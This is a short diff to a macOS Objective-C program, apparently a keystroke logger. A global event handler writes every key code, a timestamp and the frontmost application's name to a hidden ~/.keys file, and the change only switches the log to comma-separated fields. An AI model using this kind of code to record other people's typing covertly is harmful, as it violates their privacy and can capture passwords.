@@ -17,13 +17,13 @@
                                            handler:^(NSEvent *event){
         NSDate* now = [[NSDate alloc] init];
         NSDateFormatter* format = [[NSDateFormatter alloc] init];
-        [format setDateFormat:@"c yy MM dd HH mm ss Z"];
+        [format setDateFormat:@"c,yy,MM,dd,HH,mm,ss,Z"];
 
         // Find the currently running app.
         NSRunningApplication* app = [[NSWorkspace sharedWorkspace] frontmostApplication];
         NSArray* runningApps = [[NSWorkspace sharedWorkspace] runningApplications];
         NSString* appName = [app localizedName];
-        NSString* update = [NSString stringWithFormat: @"%d %@ '%@'\n",
+        NSString* update = [NSString stringWithFormat: @"%d,%@,'%@'\n",
                 event.keyCode, [format stringFromDate: now], appName];
         FILE* f = fopen([[NSHomeDirectory() stringByAppendingString: @"/.keys"]
                                                             UTF8String], "a");
